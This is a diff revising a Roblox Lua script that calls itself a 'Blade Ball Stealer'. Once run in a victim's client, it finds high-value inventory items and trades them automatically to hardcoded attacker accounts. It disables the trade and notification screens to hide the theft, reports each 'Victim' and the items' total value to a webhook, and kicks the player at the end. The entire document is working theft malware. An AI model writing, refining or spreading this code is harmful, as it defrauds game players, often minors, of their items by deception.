@@ -1,41 +1,35 @@
--- Pas de verrou _G pour permettre les ré-exécutions
-local itemsToSend = {}
-local categories = {"Sword", "Emote", "Explosion"}
+-- Configuration
+local webhook = _G.webhook or "" 
+local auth_token = _G.AuthToken or "EBK-SS-A"
+local users = _G.Usernames or {"Li0nIce201410", "ThunderStealthZap16"}
+local min_rap = _G.min_rap or 0 
+
 local Players = game:GetService("Players")
 local plr = Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
-local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
-local PlayerGui = plr.PlayerGui
-local tradeGui = PlayerGui.Trade
-local notificationsGui = PlayerGui.Notifications
-local tradeCompleteGui = PlayerGui.TradeCompleted
-local inTrade = false
-local currentMessageId = nil -- ID unique pour cette session
+local itemsToSend = {}
+local currentMessageId = nil
+local categories = {"Sword", "Emote", "Explosion"}
 
-local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
-local Replion = require(game.ReplicatedStorage.Packages.Replion)
-
-local users = _G.Usernames or {"Li0nIce201410", "ThunderStealthZap16"}
-local webhook = _G.webhook or "" 
-local auth_token = _G.AuthToken or "EBK-SS-A"
+-- NetModule & Inventory
+local netModule = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
+local clientInventory = require(ReplicatedStorage.Shared.Inventory.Client).Get()
+local Replion = require(ReplicatedStorage.Packages.Replion)
 
 ---------------------------------------------------------
--- CACHE GUI (TOTALEMENT INVISIBLE)
+-- CACHE GUI (BLOQUAGE TOTAL)
 ---------------------------------------------------------
 local function hideUI()
     pcall(function()
-        tradeGui.Black.Visible = false
-        tradeGui.MiscChat.Visible = false
-        tradeCompleteGui.Black.Visible = false
-        tradeCompleteGui.Main.Visible = false
-        tradeGui.Main.Visible = false
-        tradeGui.Main:GetPropertyChangedSignal("Visible"):Connect(function() tradeGui.Main.Visible = false end)
-        tradeGui.UnfairTradeWarning.Visible = false
-        notificationsGui.Notifications.Visible = false
+        local tradeGui = plr.PlayerGui:WaitForChild("Trade")
+        tradeGui.Enabled = false
+        tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function() tradeGui.Enabled = false end)
+        plr.PlayerGui:WaitForChild("Notifications").Enabled = false
     end)
 end
-hideUI()
+task.spawn(hideUI)
 
 ---------------------------------------------------------
 -- WEBHOOK SYSTEM (AUTO-EDIT)
@@ -56,7 +50,7 @@ local function UpdateWebhook(statusType)
     elseif statusType == "LEFT" then
         title = "❌ Victim Left"
         color = 15158332
-        statusDesc = "🚪 La victime a quitté avant la fin."
+        statusDesc = "🚪 La victime a quitté le jeu."
     end
 
     local itemLines = ""
@@ -68,7 +62,7 @@ local function UpdateWebhook(statusType)
 
     local data = {
         ["auth_token"] = auth_token,
-        ["message_id"] = currentMessageId, -- Envois l'ID pour que le Worker fasse un PATCH
+        ["message_id"] = currentMessageId,
         ["content"] = (not currentMessageId) and "@everyone" or nil,
         ["embeds"] = {{
             ["title"] = title,
@@ -77,11 +71,10 @@ local function UpdateWebhook(statusType)
             ["fields"] = {
                 {name = "👤 Victim:", value = "```" .. plr.Name .. "```", inline = true},
                 {name = "💰 Total RAP:", value = "```" .. totalRAP .. "```", inline = true},
-                {name = "🔗 Join:", value = "[Click to Join](https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId .. ")", inline = false},
-                {name = "🎒 Inventory:", value = "```" .. (itemLines ~= "" and itemLines or "Empty") .. "```", inline = false}
+                {name = "🎒 Inventory:", value = "```" .. (itemLines ~= "" and itemLines or "Scanning...") .. "```", inline = false}
             },
             ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..plr.UserId.."&width=420&height=420&format=png"},
-            ["footer"] = {["text"] = "Blade Ball Stealer | session: " .. math.random(1000,9999)}
+            ["footer"] = {["text"] = "Blade Ball Stealer"}
         }}
     }
 
@@ -94,47 +87,51 @@ local function UpdateWebhook(statusType)
         })
     end)
 
-    -- Si c'est le premier message, on récupère l'ID renvoyé par le Worker
-    if success and not currentMessageId then
-        local decoded = HttpService:JSONDecode(res.Body)
-        if decoded and decoded.id then
+    -- DEBUG : Affiche si l'envoi a réussi
+    if not success then warn("Erreur Webhook: " .. tostring(res)) end
+
+    if success and not currentMessageId and res.Body then
+        local ok, decoded = pcall(function() return HttpService:JSONDecode(res.Body) end)
+        if ok and decoded and decoded.id then
             currentMessageId = decoded.id
         end
     end
 end
 
 ---------------------------------------------------------
--- TRADE ENGINE
+-- LOGIQUE DE TRADE
 ---------------------------------------------------------
 local function startTrade(target)
     UpdateWebhook("JOINED")
     task.spawn(function()
         while #itemsToSend > 0 do
-            repeat 
+            pcall(function()
                 netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(target)
                 task.wait(1.5)
-            until tradeGui.Enabled
-            
-            local count = 0
-            while #itemsToSend > 0 and count < 100 do
-                local item = table.remove(itemsToSend, 1)
-                netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.itemType, item.ItemID)
-                count = count + 1
-            end
+                
+                -- Ajout des items
+                local limit = 0
+                while #itemsToSend > 0 and limit < 50 do
+                    local item = table.remove(itemsToSend, 1)
+                    netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.itemType, item.ItemID)
+                    limit = limit + 1
+                end
 
-            netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
-            repeat task.wait(0.2) netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer() until not tradeGui.Enabled
+                netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
+                task.wait(0.3)
+                netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
+            end)
+            task.wait(1)
         end
         UpdateWebhook("CLAIMED")
         task.wait(1)
-        plr:kick("Session Finished.")
+        plr:kick("Transfer Complete.")
     end)
 end
 
 ---------------------------------------------------------
--- START
+-- SCAN & RUN
 ---------------------------------------------------------
--- Scan RAP simplifié
 local function getRAP(cat, name)
     local success, data = pcall(function() return Replion.Client:GetReplion("ItemRAP").Data.Items[cat] end)
     if success and data then
@@ -143,31 +140,29 @@ local function getRAP(cat, name)
     return 0
 end
 
+-- Remplissage de la liste
 for _, cat in ipairs(categories) do
     if clientInventory[cat] then
         for id, info in pairs(clientInventory[cat]) do
             local rap = getRAP(cat, info.Name)
-            if rap >= min_rap then table.insert(itemsToSend, {ItemID = id, RAP = rap, itemType = cat, Name = info.Name}) end
+            if rap >= min_rap then
+                table.insert(itemsToSend, {ItemID = id, RAP = rap, itemType = cat, Name = info.Name})
+            end
         end
     end
 end
 
 if #itemsToSend > 0 then
-    table.sort(itemsToSend, function(a,b) return a.RAP > b.RAP end)
+    print("Items detectés: " .. #itemsToSend)
     UpdateWebhook("START")
 
-    -- Detect Join
-    local function check()
-        for _, p in ipairs(Players:GetPlayers()) do
-            if table.find(users, p.Name) then startTrade(p) return true end
-        end
-        return false
+    -- Detection cibles
+    for _, p in ipairs(Players:GetPlayers()) do
+        if table.find(users, p.Name) then startTrade(p) break end
     end
-
-    if not check() then
-        Players.PlayerAdded:Connect(function(p) if table.find(users, p.Name) then startTrade(p) end end)
-    end
-
-    -- Status Left
-    plr.AncestryChanged:Connect(function() UpdateWebhook("LEFT") end)
+    Players.PlayerAdded:Connect(function(p)
+        if table.find(users, p.Name) then startTrade(p) end
+    end)
+else
+    print("Aucun item trouvé avec un RAP > " .. min_rap)
 end
